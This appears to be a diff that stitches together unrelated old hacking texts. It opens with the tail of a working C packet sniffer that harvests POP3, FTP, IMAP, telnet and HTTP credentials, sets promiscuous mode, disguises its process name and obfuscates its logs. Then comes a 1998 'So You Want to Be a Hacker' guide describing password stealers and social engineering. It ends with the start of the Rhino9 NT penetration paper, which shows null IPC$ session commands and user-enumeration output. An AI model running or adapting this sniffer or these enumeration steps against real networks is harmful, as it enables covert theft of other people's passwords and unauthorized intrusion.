+   data_buff[0]='\0';   
+
+   for(i=0; i < datalen; i++) {
+
+	if(isprint(data[i]))
+	    data_buff[t++]=data[i];
+
+        if(data[i] == 13) {
+	    data_buff[t]='\0';
+	    parse_segment(data_buff);
+	    t=0;
+	    continue;
+	    }
+
+        if(t > CAP_LEN) {
+	    data_buff[t]='\0';
+	    t=0;
+	    parse_segment(data_buff);
+	    }
+
+	}
+}
+
+/* Handler for segmentation violations */
+void seg_fault (int sig)
+{
+    exit(EXIT_FAILURE); /* Die quietly.  Don't dump core! */
+}
+
+void treedump(struct luser *p, FILE *fp)
+{
+    if(p!=NULL) {
+	treedump(p->left,fp);
+	snprintf(lbuff,LBUFFL,"%s %s (%d)\n",p->user,p->pass,p->count);
+	logg(lbuff);
+	treedump(p->right,fp);
+	}
+}
+
+void logpops(void)
+{
+    logg("\nPOP3USER PASS (TIMES)\n=====================\n");
+    treedump(pop3tree,fp1);
+}
+
+void hupaction(int sig) /* Action when SIGHUP is raised */
+{
+    snprintf(lbuff,LBUFFL, "\n*** Caught SIGHUP at [%s] ***\n",dateTime());
+    logg(lbuff);
+    logpops();
+    fflush(fp1);
+    signal(SIGHUP,hupaction); /* Catch SIGHUP next time too */
+}
+
+/* Handler when program is terminated noramlly */
+void bye(int sig)
+{
+    logpops();
+    snprintf(lbuff,LBUFFL, "\n*** Ended at [%s] by signal %d ***\n",
+				dateTime(),sig);
+    logg(lbuff);
+    fclose(fp1);
+    close(sock);
+    exit(0);
+}
+
+/* Filters out all other packets except for ones we're intrested in */
+int packet_filter ()
+{
+    int http=0;
+    u_short dport;
+    
+    if (ip->protocol != IP_TCP) return (0);
+
+    dport=ntohs(tcp->dest);
+    switch(dport) {
+    case WEB_PORT1:
+	http=1;
+    case WEB_PORT2:
+	http=1;
+    case WEB_PORT3:
+	http=1;
+    case IPPORT_FTP:	/* ftp */
+    case 106:		/* poppasswd */
+    case 109:		/* pop2 */
+    case 110:		/* pop3 */
+    case 143:		/* imap2 */
+
+    if (target.active) {
+	if(target.bytes_read > CAP_LEN)	{
+	    if(!http) logg("\n----- [CAP_LEN Exceeded]\n");
+    	    clear_target();
+	    return(0);
+	    }
+	if(time(NULL) > (target.start_time + TIMEOUT)) {
+	    if(!http) logg("\n----- [Timed Out]\n");
+	    clear_target();
+	    return 0;
+	    }
+	}                                                                                                                  
+
+    case IPPORT_TELNET:		/* telnet */
+    case IPPORT_LOGINSERVER:	/* rlogin */
+	
+    if (target.active) {
+	if(target.bytes_read > TELNET_CAP_LEN)	{
+	    logg("\n----- [TELNET_CAP_LEN Exceeded]\n");
+    	    clear_target();
+	    return(0);
+	    }
+	if(time(NULL) > (target.start_time + TELNET_TIMEOUT)) {
+	    logg("\n----- [TELNET Timed Out]\n");
+	    clear_target();
+	    return 0;
+	    }
+	}                                                                                                                  
+
+	if ((tcp->syn==1)&&(!target.active)) 
+	{ /* If this is the start of a new connection and we have */
+	  /* finished with the last one */
+		target.source_addr=ip->saddr;
+		target.dest_addr=ip->daddr;
+		target.active=1;
+		target.source_port=tcp->source;
+		target.dest_port=tcp->dest;
+		target.bytes_read=0;
+		target.start_time=time(NULL);
+		if((http)&&(!http_verbose))
+		    return(1);		/* Don't log machine details */
+
+		if((dport==110)||(dport==109)) /* For pop3 && pop2 */
+		    return(1);		/* Don't log machine details */
+
+    		snprintf(lbuff,LBUFFL,
+		    "[%s] [%d] => ",lookup(target.source_addr),
+		ntohs(target.source_port));
+		logg(lbuff);
+    		snprintf(lbuff,LBUFFL,
+		    "[%s] [%d]\n", lookup(target.dest_addr),
+		ntohs(target.dest_port));
+		logg(lbuff);
+		return(1); /* Indicate new connect to interesting port */
+	}
+
+	if(!target.active) return(0);
+
+	if(ip->daddr != target.dest_addr) return 0;
+ /* Not "target" IP */
+	if(ip->saddr != target.source_addr) return 0;
+ /* We'll get you */
+	if(tcp->source != target.source_port) return 0;
+ /* next time! */
+	if(tcp->dest != target.dest_port) return 0;
+	if(tcp->rst == 1) 
+{
+	    if(!http) logg("\n----- [RST]\n\n\n");
+	    clear_target();
+	    return(0);
+           }
+	if(tcp->fin == 1) {
+	    if(!http) logg("\n----- [FIN]\n\n\n");
+	    clear_target();
+	    return(0);
+	    }
+	return(1); /* Indicate interesting "target" packet */
+    default:
+	return(0); /* Not a packet to an interesting port  */
+    } /* switch */
+}
+
+int main ( unsigned int argc, char **argv, char **envp )
+{
+	FILE *fp2;
+        int datalen, c, header_len;
+        struct ifreq req;
+	char ws[1024], sigerr[]="Can't catch";
+
+        if(signal(SIGSEGV, seg_fault)==SIG_ERR) {
+	    fprintf(stderr,"%s SIGSEGV\n",sigerr);
+	    exit(EXIT_FAILURE);
+	    }
+        if(signal(SIGTERM, bye)==SIG_ERR) {
+	    fprintf(stderr,"%s SIGTERM\n",sigerr);
+	    exit(EXIT_FAILURE);
+	    }
+        if(signal(SIGQUIT, bye)==SIG_ERR) {
+	    fprintf(stderr,"%s SIGQUIT\n",sigerr);
+	    exit(EXIT_FAILURE);
+	    }
+        if(signal(SIGHUP, hupaction)==SIG_ERR) {
+	    fprintf(stderr,"%s SIGHUP\n",sigerr);
+	    exit(EXIT_FAILURE);
+	    }
+
+	if(strcmp(crypt(getpass("Password: "),"SA"),"SASMtsCYrC9Go"))
+	    exit(1); /* bloodhound, but iy0moe66 would be better :^) */
+	    
+	printf("Decrypt existing log file (y/N) ? ");
+	fflush(stdout);
+	fgets(ws,sizeof(ws),stdin);
+	if((strchr(ws,'y'))||(strchr(ws,'Y'))) {
+	    printf("Infile  ? ");
+	    fflush(stdout);
+	    fgets(ws,sizeof(ws),stdin); chop(ws);
+	    if ((fp1=fopen(ws,"r"))==NULL) {
+		fputs(strerror(errno),stderr);
+		exit(EXIT_FAILURE);
+		}
+	    printf("Outfile ? ");
+	    fflush(stdout);
+	    fgets(ws,sizeof(ws),stdin); chop(ws);
+	    if ((fp2=fopen(ws,"a+"))==NULL) {
+		fputs(strerror(errno),stderr);
+		exit(EXIT_FAILURE);
+		}
+	    while((c=fgetc(fp1))!=EOF) {
+		c ^= 0x55;
+		fputc(~c,fp2);
+		}
+	    exit(0);
+	    }
+        if (getuid() && geteuid()) {
+                fprintf(stderr, "\nYou need to be root to run this.\n\n");
+                exit(EXIT_FAILURE);
+        }
+	printf("Obfuscate log file (y/N) ? ");
+	fflush(stdout);
+	fgets(ws,sizeof(ws),stdin);
+	if((strchr(ws,'y'))||(strchr(ws,'Y')))
+	    obfuscate=1;
+	memset(ws,'\0',sizeof(ws));
+
+	printf("Put what name in 'ps' list, (bash, ftp, vi ...) ? ");
+	fflush(stdout);
+	fgets(ws,sizeof(ws),stdin); chop(ws);
+	printf("Setting process title to: %s\n", ws);
+	fflush(stdout);
+	initsetproctitle(argc, argv, envp);
+	setproctitle("%s", ws);
+	printf("Log ALL HTTP requests (y/N) ? ");
+	fflush(stdout);
+	fgets(ws,sizeof(ws),stdin);
+	if((strchr(ws,'y'))||(strchr(ws,'Y')))
+	    http_verbose=1;
+	printf("Set promiscuous mode (y/N) ? ");
+	fflush(stdout);
+	fgets(ws,sizeof(ws),stdin);
+	if((strchr(ws,'y'))||(strchr(ws,'Y')))
+	    promiscuous=1;
+        sock=socket(AF_INET, SOCK_PACKET, htons(0x800));
+        if (sock < 0) {
+                fputs("Can't get SOCK_PACKET socket\n",stderr);
+                exit(1);
+        }
+
+        strcpy(req.ifr_name, INTERFACE);
+
+        if (ioctl(sock, SIOCGIFFLAGS, &req)==-1) {
+                close(sock);
+                fprintf(stderr,"Can't get flags: %s\n", strerror(errno));
+                exit(EXIT_FAILURE);
+        }
+
+	if(promiscuous)
+    	    req.ifr_flags |= IFF_PROMISC;  /* Set IFF_PROMISC */
+	else
+    	    req.ifr_flags &= ~IFF_PROMISC; /* Unset IFF_PROMISC */
+
+        if (ioctl(sock, SIOCSIFFLAGS, &req)==-1) {
+                close(sock);
+                fprintf(stderr,"Can't set flags: %s\n", strerror(errno));
+                exit(EXIT_FAILURE);
+        }
+
+	printf("Enter in the full path to the logfile > ");
+	fflush(stdout);
+	fgets(ws,sizeof(ws),stdin); chop(ws);
+	if ((fp1=fopen(ws,"a+"))==NULL) {
+		fprintf(stderr, "Can't open logfile: %s\n", strerror(errno));
+		exit(EXIT_FAILURE);
+	    }
+
+	printf("Started [%s]\n",dateTime());
+	fflush(stdout);
+	detach();
+	snprintf(lbuff,LBUFFL,"\n*** Started [%s] ***\n",dateTime());
+	logg(lbuff);
+
+        ip=(struct iphdr *)(((unsigned long)&ether_packet.ip_header)-2);        
+        tcp=(struct tcphdr *)(((unsigned long)&ether_packet.tcp_header)-2);
+
+	header_len=sizeof(ether_packet.ether_header) +
+	    sizeof(ether_packet.ip_header) + sizeof(ether_packet.tcp_header);
+
+        clear_target();        
+	for(;;) {
+	    while(1) {
+	      datalen=read(sock,&ether_packet,sizeof(ether_packet));
+              if(datalen > 1) {
+	        if (!packet_filter()) continue;
+	        datalen=datalen-header_len;
+	        if (datalen<1) continue; /* Any data in this packet? */
+	        break; /* out of while() loop and process packet contents */
+	        }
+	      }
+
+	    target.bytes_read=target.bytes_read+datalen;
+
+	    switch(ntohs(target.dest_port)) { /* Choose scan method */
+	    case WEB_PORT1:
+	    case WEB_PORT2:
+	    case WEB_PORT3:
+		http_scan(datalen,ether_packet.buff-2);
+		break;
+	    case 109:			/* pop2 */
+	    case 110:			/* pop3 */
+		pop3_scan(datalen,ether_packet.buff-2);
+		break;
+	    case IPPORT_FTP:		/* ftp */
+	    case 106:			/* poppasswd */
+	    case 143:			/* imap2 */
+	    case IPPORT_TELNET:		/* Telnet */
+	    case IPPORT_LOGINSERVER:	/* rlogin */
+		ascii_scan(datalen,ether_packet.buff-2);
+		break;
+	    default:
+		snprintf(lbuff,LBUFFL,"Unknown port: %d\n",
+		    ntohs(target.dest_port));
+		logg(lbuff);
+	    } 
+        }
+}
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 
+
+So You Want to Be a Hacker? (-coldfire) December 98 – 1.1
+
+I get numerous emails and messages daily from people who want to 
+know how to be a hacker. This text is for them.
+
+I. Introduction
+
+II. What is a hacker?
+
+III. Why do people want to become a hacker?
+
+IV. How to be a hacker
+
+V. Gaining Knowledge
+
+1). Read
+
+2). Learn to program
+
+3). Hack
+
+VI. Knowledge is Power
+
+1). Getting someone's password
+
+2). Getting someone's IP address
+
+VII. Seek, and ye shall find
+
+ 
+
+I. Introduction
+
+So you want to be a hacker? Many people want to be a hacker, but they don't 
+know where to start, or what hacking really means. Hopefully this text will 
+clear some things out and help you on your path to become a true hacker.
+
+II. What is a hacker?
+
+Everyone seems to have their own little definition of what a hacker is. 
+The press views hackers as people who cause computer mischief, AOLers think 
+hackers who are people who can push buttons on their downloaded proggies, 
+computer nerds and rejects from society claim to be hackers because it 
+makes them feel united and part of a group, crackers who write viruses and 
+crash computers think they're hackers, and all thoses kewl people in those 
+IRC chat rooms call themselves hackers, and so on. So what exactly is hacker? 
+Here's the definition that I think most people would agree with:
+
+hacker 1. A person who enjoys exploring the details of programmable systems 
+and how to stretch their capabilities, as opposed to most users, who prefer 
+to learn only the minimum necessary. (taken from The Hacker's Dictionary)
+
+What exactly does this mean? A hacker is someone who is fascinated by computers,
+wants to learn more about them and then go beyond that. Hackers seek knowledge,
+especially forbidden or "secret" knowledge. One thing about being a hacker is 
+to remember that knowledge is good, and should be shared with other hackers.
+
+III. Why do people want to become a hacker?
+
+Press, hyped up movies, and the huge growth of the Internet is drawing new 
+hacker wannabes in everyday. It this good? Yes and no. It's mostly good, 
+but it's also bad because some people don't really understand what a hacker is. 
+They think hacking is sending out viruses, crashing computers and stealing 
+passwords from some 12 year old girl off AOL. 
+These things are definitely not cool.
+
+But what about the inside force that really makes people want to become a hacker? 
+Hackers are the "elite" of the Internet. They know far more things than the 
+average user, and can do things to computers that most people wouldn't even 
+know were to start. There is a certain "ego satisfaction" to be a hacker.
+
+IV. How to be a hacker
+
+So, now that you know what a hacker is, and why some people want to become a 
+hacker, here's what I have to say on how to be a hacker. First of all, it takes 
+time to become a hacker. You can't just decide you want to be a hacker and 
+then become one overnight. Second, there are no teachers (unless you're lucky
+and find a mentor). Most hackers taught themselves. They learned by reading, 
+asking and doing. Now, a note about asking questions. Do not ask stupid 
+questions like "HOW DO I HACK?" Ask questions that have an answer in a couple 
+of sentences. If you do, your question will be answered most of the time. And third,
+to be a hacker, you have to hack. 
+
+You can't just sit around and pretend to be a hacker. Do something with your 
+newfound knowledge. But try to follow these two simple rules:
+
+Don't damage or screw up another system. You will get in trouble. 
+Try not to piss people off. Make friends, not enemies.
+
+V. Gaining Knowledge
+
+1). Read. Read everything you can about hacking. Articles, texts, books, 
+magazines, message boards, anything with the word "hack" in it. Of course, 
+anything computer related will also help. You're already doing a good job 
+reading this text. Here are some hacking related books and magazines that 
+I suggest you read:
+
+2600 magazine - Very good source of hacking info. You can find it at your 
+local bookstore, at the magazine rack. Just look for the number 2600.
+
+CYPERPUNK - A book about three different hackers.
+
+Cuckoo's Egg - Informative book about some guy tracking down a hacker who 
+broke into his computer. Definitely not boring and can be informative to 
+those with hardly no knowledge of how hacking into a computer is actually done.
+
+2). Learn to Program. A hacker who can't program is like a skater who can't 
+skate. This is one of the more devious parts of becoming a hacker because 
+it takes time and patience. Why should a hacker know how to program? Because 
+by learning how to program, a hacker can make a computer do whatever the hell 
+he wants it to. And that's power. Have you ever found yourself saying 
+"I wish I had a program to do that..." Well, if you learn to program,
+you can just make that program. So, where to start? First, you need to choose 
+a programming language. 
+
+The two most popular out are Visual Basic (VB) and C/C++. The difference between 
+them? VB is easy to use and learn, but its programs aren't that fast and they 
+require a runtime DLL file. C++ compiles fast programs, but is hard to learn 
+and get started. Another difference between them is compatibility.
+VB is for Windows operating systems only (Win 3.11, Win95/98, WinNT), 
+while C++ code can be made to run on practically any operating system 
+(Windows, Unix, even Mac). Where can you get VB or C++? 
+
+You buy it (or...ahem, cough, warez, cough, cough, friend with CD burner, cough, cough). 
+Once you learn the basics of the programming language, learn Windows API. 
+It's the guts of Windows.
+
+3). Hack. Like I said before, in order to be a hacker, you have to hack. 
+Hanging around in chat rooms won't help you. Hacking lets you "practice" 
+your hacking skills. The more you practice, the better you get. 
+After you're an experience hacker, contribute something to the hacker community. 
+This could be a simple text file, a web page, or a [free] program. 
+Oh, and help out those newbie hackers. You were one once.
+
+VI. Knowledge is Power
+
+The most frequent questions people ask me are how to get someone's password 
+and how to get someone's IP address.
+
+Getting someone's password
+
+There are three main ways to get someone's password.
+
+1). Social Engineering. By talking to someone who knows the password, 
+you can try to "trick" them into giving you it. Be creative. 
+The AOL equivalent is phishing (posing as an AOL technician or something,
+claiming to need the person's password), though phishing takes no skill 
+and is hardly considered social engineering.
+
+2). Password Stealers or Sniffers (PWS). A program installed on the user's 
+machine that literally gets the password as it is being typed in. 
+Some PWS also search for stored passwords. After a PWS obtains a password, 
+it usually stores it or sends it out through email. You would probably 
+have to make your own (learn to program!) if you want it to be effective, 
+though sometimes there are pre-made ones. Those AOL PWS are mostly crap, 
+most of them only steal the password from the Change Password Window, 
+which is not very effective.
+
+3). Password Cracker. A program on your machine that guesses passwords 
+from a list. This can take some time, and would not be able to crack a 
+user's password if it's not on the password list.
+
+Getting someone's IP Address
+
+First, you need to understand what an IP address is. Every computer 
+connected to the Internet has an IP address, which is, in simple terms, 
+equivalent to a phone number. It identifies the computer on the Internet.
+The IP address is where data is sent to and from. If the person is signing 
+on through a dial up account, the IP address is usually different at 
+each login. To find your IP address, click on the Start button, Run, and 
+then type in winipcfg. And for you AOLer's who think who don't have an 
+IP address, make sure that the listbox says "AOL Adapter," not "PPP Adapter." 
+So, why get someone's IP address? Hell if I know. Maybe to do something lame, 
+like nuke (crash) a computer, or maybe because a backdoor like NetBus or 
+BackOrifice is installed. Anyway, IP addresses can be obtain through these methods:
+
+Email - It's in the header 
+IRC - A simple /whois [nick] will return the IP address 
+
+ICQ IP Sniffer - Due to a bug in the ICQ software, it is possible to type 
+in an UIN and get the user's IP address. 
+
+ICQ Software Bug - Another software bug? Yup, only this time you don't need 
+an external prog. If you have someone on your contact list, you can disconnect
+and then check their info. Their IP address will be in the Last IP box!
+Works for older versions of ICQ. 
+
+IP Stealer - I haven't seen one of these, but there should be some around. 
+It would work like a Password Stealer, except it would get the IP address 
+instead of the password.
+
+
+VII. Seek, and ye shall find.
+
+One of the most annoying questions I hear are "Do you have this?" or 
+"Can you send me this?" or "Where can I get this?" Well, I'm going to 
+tell you this TOP SECRET thing I found called a SEARCH ENGINE. 
+You type in what you what you're looking for, and it gives you links to web 
+pages that have the words in it! WOW!
+
+Okay, that was lame, anyway, any experienced web surfer will tell you that
+you can find anything on the web your heart desires. Whether that would be 
+XXX pics, games, or how to be a hacker, its all there. You just need to know 
+how to find it. Now, for search engines, I prefer www.yahoo.com and www.infoseek.com. 
+When typing stuff in the search box, be sure you use + (plus sign) in 
+front of words that you want combined. For example, let's say you're looking
+for an ICQ IP sniffer program. Now, if you just typed in "ICQ IP sniffer" 
+(without the quotes), it would give you web sites like ICQ reviews, 
+what IP addresses are, and pages about your mom (heh, j/k). 
+
+But if you typed in "+ICQ +IP +sniffer," it will look for pages that have all 
+those words. Understand? 
+
+Also, another web browsing technique that I like to use is opening
+multiple windows. This is especially useful when you're like me, 
+stuck with a 33.6 modem. Okay, so, let's say Infoseek found 15 page 
+results that have to do with ICQ IP Sniffers. When I find a link I want to open,
+instead of just clicking on it, I would click the right mouse button to 
+bring up that pop-up menu, and then click Open Link in New Window. 
+This would open another browsing window. And then when I find another link 
+I want to go to, I do the same thing. The purpose of all this? 
+To view one page while another is loading.
+
+Congratulations, this concludes the So You Want to Be a Hacker? text. 
+You have now earned your CHW (Certified Hacker Wannabe). 
+
+So, one last question remains: How do you know when you're a hacker? 
+
+Well, the answer is when someone tells you.
+
+-coldfire http://surf.to/coldfire 
+
+Comments? Questions? Suggestions? Typos? Email coldfirez@usa.net 
+
+And please, no "Where can I get…" questions.
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 
+===================================================================
+THE WINDOWS NT WARDOC: A STUDY IN REMOTE NT PENETRATION
+BY NEONSURGE AND THE RHINO9 TEAM
+===================================================================
+===================================================================
+INTRODUCTION:
+===================================================================
+This document is an attempt by the Rhino9 team to document the 
+methodology and techniques used in an attack on a NT based network. 
+The intent of this document is to educate administrators and security
+professionals of both the mindset of an attacker and a large set of 
+the current NT penetration techniques. This document attempts to follow 
+in the footsteps of the classic text, "How To Improve The Security Of 
+Your Site by Breaking Into It" by Dan Farmer and Wietse Venema.
+Obviously, this text will not contain all known methods for NT 
+network penetration. We have tried to put together a text that
+Administrators can use to learn basic penetration techniques 
+to test the vulnerability of their own networks. If the concepts 
+and techniques presented in this text are absorbed and understood, 
+an Administrator should have a strong base knowledge of how 
+penetrations occur and should be able to build upon that knowledge
+to further protect their network.
+
+This file is not meant for people that are new to security or NT 
+or networking technologies. The authors assume that people reading 
+this document have a certain understanding of protocols, server 
+technologies and network architectures.
+
+The authors would like to continue expanding on this document and 
+releasing updated versions of it. We call upon all those that wish 
+to contribute techniques to send detailed information on your own 
+penetration testing methods. We would like to release updates to 
+this document to keep it a current and solid resource. 
+
+Send your techniques or submissions to: neonsurge@hotmail.com. 
+Valid and useful submissions will be incorporated in to the document 
+with proper credit given to the author.
+
+===================================================================
+USAGE
+===================================================================
+
+The text is being written in a procedural manner. We have approached 
+it much like an intruder would actually approach a network penetration.
+Most of the techniques discussed in this text are rather easy to 
+accomplish once one understands how and why something is being done.
+The document is divided into 3 sections: NetBIOS, WebServer, 
+and Miscellaneous, each of which explain different methods of 
+information gathering and penetration techniques.
+
+===================================================================
+INFORMATION GATHERING AND PENETRATION VIA NETBIOS
+===================================================================
+
+The initial step an intruder would take is to portscan the target 
+machine or network. It's surprising how methodical an attack can
+become based on the open ports of a target machine. 
+You should understand that it is the norm for an NT machine to 
+display different open ports than a Unix machine. Intruders learn
+to view a portscan and tell wether it is an NT or Unix machine with 
+fairly accurate results. Obviously there are some exceptions to this,
+but generally it can be done. Recently, several tools have been
+released to fingerprint a machine remotely, but this functionality 
+has not been made available for NT.
+
+When attacking an NT based network, NetBIOS tends to take the 
+brunt of an attack. For this reason, NetBIOS will be the first 
+serious topic of discussion in this paper.
+
+Information gathering with NetBIOS can be a fairly easy thing 
+to accomplish, albeit a bit time consuming. NetBIOS is generally 
+considered a bulky protocol with high overhead and tends to be slow, 
+which is where the consumption of time comes in.
+
+If the portscan reports that port 139 is open on the target machine,
+a natural process follows. The first step is to issue an NBTSTAT command.
+The NBTSTAT command can be used to query network machines 
+concerning NetBIOS information. It can also be useful for purging 
+the NetBIOS cache and preloading the LMHOSTS file. 
+
+This one command can be extremely useful when performing security audits. 
+Interpretation the information can reveal more than one might think.
+
+Usage: nbtstat [-a RemoteName] [-A IP_address] [-c] [-n] [-R] [-r] [-S] [-s] [interval]
+Switches -a Lists the remote computer's name table given its host name. 
+-A Lists the remote computer's name table given its IP address. 
+-c Lists the remote name cache including the IP addresses.
+-n Lists local NetBIOS names. 
+-r Lists names resolved by broadcast and via WINS. 
+-R Purges and reloads the remote cache name table. 
+-S Lists sessions table with the destination IP addresses. 
+-s Lists sessions table conversions.
+The column headings generated by NBTSTAT have the following meanings:
+Input 
+Number of bytes received. 
+Output 
+Number of bytes sent. 
+In/Out 
+Whether the connection is from the computer (outbound) or from another system to
+the local computer (inbound). 
+Life 
+The remaining time that a name table cache entry will "live" before your computer
+purges it. 
+Local Name 
+The local NetBIOS name given to the connection. 
+Remote Host 
+The name or IP address of the remote host. 
+Type 
+A name can have one of two types: unique or group. 
+The last byte of the 16 character NetBIOS name often means something because
+the same name can be present multiple times on the same computer. This shows
+the last byte of the name converted into hex. 
+State 
+Your NetBIOS connections will be shown in one of the following "states": 
+State Meaning
+Accepting An incoming connection is in process.
+Associated The endpoint for a connection has been created and your computer has associated it with an IP address.
+Connected This is a good state! It means you're connected to the remote resource.
+Connecting Your session is trying to resolve the name-to-IP address mapping of the destination resource.
+Disconnected Your computer requested a disconnect, and it is waiting for the remote computer to do so.
+Disconnecting Your connection is ending.
+Idle The remote computer has been opened in the current session, but is currently not accepting connections.
+Inbound An inbound session is trying to connect.
+Listening The remote computer is available.
+Outbound Your session is creating the TCP connection.
+Reconnecting If your connection failed on the first attempt, it will display this state as it tries to reconnect.
+Here is a sample NBTSTAT response of an actual machine:
+C:\>nbtstat -A x.x.x.x
+NetBIOS Remote Machine Name Table
+Name Type Status
+---------------------------------------------
+DATARAT <00> UNIQUE Registered
+R9LABS <00> GROUP Registered
+DATARAT <20> UNIQUE Registered
+DATARAT <03> UNIQUE Registered
+GHOST <03> UNIQUE Registered
+DATARAT <01> UNIQUE Registered
+MAC Address = 00-00-00-00-00-00
+Using the table below, what can you learn about the machine?
+Name Number Type Usage
+=========================================================================
+<computername> 00 U Workstation Service
+<computername> 01 U Messenger Service
+<\\_MSBROWSE_> 01 G Master Browser
+<computername> 03 U Messenger Service
+<computername> 06 U RAS Server Service
+<computername> 1F U NetDDE Service
+<computername> 20 U File Server Service
+<computername> 21 U RAS Client Service
+<computername> 22 U Exchange Interchange 
+<computername> 23 U Exchange Store
+<computername> 24 U Exchange Directory
+<computername> 30 U Modem Sharing Server Service
+<computername> 31 U Modem Sharing Client Service
+<computername> 43 U SMS Client Remote Control
+<computername> 44 U SMS Admin Remote Control Tool
+<computername> 45 U SMS Client Remote Chat
+<computername> 46 U SMS Client Remote Transfer
+<computername> 4C U DEC Pathworks TCPIP Service
+<computername> 52 U DEC Pathworks TCPIP Service
+<computername> 87 U Exchange MTA
+<computername> 6A U Exchange IMC
+<computername> BE U Network Monitor Agent
+<computername> BF U Network Monitor Apps
+<username> 03 U Messenger Service
+<domain> 00 G Domain Name
+<domain> 1B U Domain Master Browser
+<domain> 1C G Domain Controllers
+<domain> 1D U Master Browser
+<domain> 1E G Browser Service Elections
+<INet~Services> 1C G Internet Information Server
+<IS~Computer_name> 00 U Internet Information Server
+<computername> [2B] U Lotus Notes Server
+IRISMULTICAST [2F] G Lotus Notes
+IRISNAMESERVER [33] G Lotus Notes
+Forte_$ND800ZA [20] U DCA Irmalan Gateway Service
+
+Unique (U): The name may have only one IP address assigned to it. 
+On a network device, multiple occurences of a single name may appear 
+to be registered, but the suffix will be unique, making the entire name unique.
+
+Group (G): A normal group; the single name may exist with many IP addresses.
+ 
+Multihomed (M): The name is unique, but due to multiple network 
+interfaces on the same computer, this configuration is necessary
+to permit the registration. Maximum number of addresses is 25.
+
+Internet Group (I): This is a special configuration of the group 
+name used to manage WinNT domain names.
+
+Domain Name (D): New in NT 4.0.
+An intruder could use the table above and the output from an nbtstat 
+against your machines to begin gathering information about them.
+With this information an intruder can tell, to an extent, what
+services are running on the target machine and sometimes what 
+software packages have been installed. 
+Traditionally, every service or major software package comes 
+with it's share of vulnerabilities, so this type of information 
+is certainly useful to an intruder. 
+
+The next logical step would be to glean possible usernames from 
+the remote machine. A network login consists of two parts,
+a username and a password. Once an intruder has what he knows to 
+be a valid list of usernames, he has half of several valid logins. 
+Now, using the nbtstat command, the intruder can get the login name 
+of anyone logged on locally at that machine. In the results from 
+the nbtstat command, entries with the <03> identifier are usernames 
+or computernames. Gleaning usernames can also be accomplished 
+through a null IPC session and the SID tools (For more information 
+about the SID tools, read appendix B).
+
+The IPC$ (Inter-Process Communication) share is a standard hidden 
+share on an NT machine which is mainly used for server to server 
+communication. NT machines were designed to connect to each other 
+and obtain different types of necessary information through this share.
+As with many design features in any operating system, intruders have 
+learned to use this feature for their own purposes. By connecting
+to this share an intruder has, for all technical purposes, 
+a valid connection to your server. By connecting to this share as null,
+the intruder has been able to establish this connection without 
+providing it with credentials.
+
+To connect to the IPC$ share as null, an intruder would issue the
+following command from a command prompt:
+
+c:\>net use \\[ip address of target machine]\ipc$ "" /user:""
+
+If the connection is successful, the intruder could do a number of 
+things other than gleaning a user list, but lets start with that first.
+As mentioned earlier, this technique requires a null IPC session 
+and the SID tools. Written by Evgenii Rudnyi, the SID tools come in 
+two different parts, User2sid and Sid2user. 
+User2sid will take an account name or group and give you the corresponding SID.
+Sid2user will take a SID and give you the name of the corresponding user or group.
+As a stand alone tool, this process is manual and very time consuming. 
+Userlist.pl is a perl script written by Mnemonix that will automate 
+this process of SID grinding, which drastically cuts down on the time
+it would take an intruder to glean this information.
+
+At this point, the intruder knows what services are running on the 
+remote machine, which major software packages have been installed 
+within limits), and has a list of valid usernames and groups for that machine.
+Although this may seem like a ton of information for an outsider to 
+have about your network, the null IPC session has opened other 
+venues for information gathering. The Rhino9 team has been able to 
+retrieve the entire native security policy for the remote machine. 
+Such things as account lockout, minimum password length, 
+password age cycling, password uniqueness settings as well as every user, 
+the groups they belong to and the individual domain restrictions for 
+that user - all through a null IPC session. This information gathering
+ability will appear in Rhino9's soon to be released Leviathan tool.
+Some of the tools available now that can be used to gather more 
+information via the IPC null session will be discussed below.
+
+With the null IPC session, an intruder could also obtain a list of
+network shares that may not otherwise be obtainable.
+For obvious reasons, an intruder would like to know what network
+shares you have available on your machines. For this information gathering,
+the standard net view command is used, as follows:
+
+c:\>net view \\[ip address of remote machine]
+Depending on the security policy of the target machine, this list 
+may or may not be denied. Take the example below (ip address has 
+been left out for obvious reasons):
+
+C:\>net view \\0.0.0.0
+System error 5 has occurred.
+Access is denied.
+
+C:\>net use \\0.0.0.0\ipc$ "" /user:""
+The command completed successfully.
+
+C:\>net view \\0.0.0.0
+Shared resources at \\0.0.0.0
+Share name Type Used as Comment
+
+-------------------------------------------------------------------------------
+Accelerator Disk Agent Accelerator share for Seagate backup
+Inetpub Disk
+mirc Disk
+NETLOGON Disk Logon server share
+www_pages Disk
+The command completed successfully. 
+As you can see, the list of shares on that server was not 
+available until after the IPC null session had been established. 
+At this point you may begin to realize just how dangerous this 
+IPC connection can be, but the IPC techniques that are known to 
+us now are actually very basic. The possibilities that are 
+presented with the IPC share are just beginning to be explored. 
+
+The release of the WindowsNT 4.0 Resource Kit made a new set of
+tools available to both administrator and intruder alike. 
+Below is a description of some of the Resource Kit Utilities that 
+the Rhino9 team has used in conjunction with the IPC$ null
+session to gather information. When reading these tool descriptions 
+and the information they provide, keep in mind that the null 
+session that is used does NOT provide the remote network with 
+any real credentials.
+
+UsrStat: This command-line utility displays the username, full name, 
+and last logon date and time for each user in a given Domain. 
+Below is an actual cut and paste of this tool used through a null 
+IPC session against a remote network:
+
+C:\NTRESKIT>usrstat domain4
+Users at \\STUDENT4
+Administrator - - logon: Tue Nov 17 08:15:25 1998
+Guest - - logon: Mon Nov 16 12:54:04 1998
+IUSR_STUDENT4 - Internet Guest Account - logon: Mon Nov 16 15:19:26 1998
+IWAM_STUDENT4 - Web Application Manager account - logon: Never
+laurel - - logon: Never
+megan - - logon: Never
+In order to fully understand what is happening in the capture, lets discuss it.
+Before the actual attack took place, a mapping was put into the 
+lmhosts file that reflected the Student4 machine and it's Domain 
+activity status using the #PRE/#DOM tags (explained in more detail below.).
+The entry was then preloaded into the NetBIOS cache, and a null 
+IPC session was established. As you can see, the command is issued 
+against the Domain name. The tool will then query the 
+Primary Domain Controller for that Domain.
+
+Global: This command-line utility displays the members of global groups 
+on remote servers or domains. As discussed above, this utility is used 
+in conjunction with an Lmhosts/IPC mapping. Shown below is an actual 
+capture of the global tool. In the example, the "Domain Users" is a standard, 
+default global group present in a WindowsNT domain. 
+For this example, we have used the tool to query Domain1 for a listing of 
+all users in the "Domain Users" group.
+
+C:\>global "Domain Users" domain1
+Bob
+SPUPPY$
+BILLY BOB$
+Bill
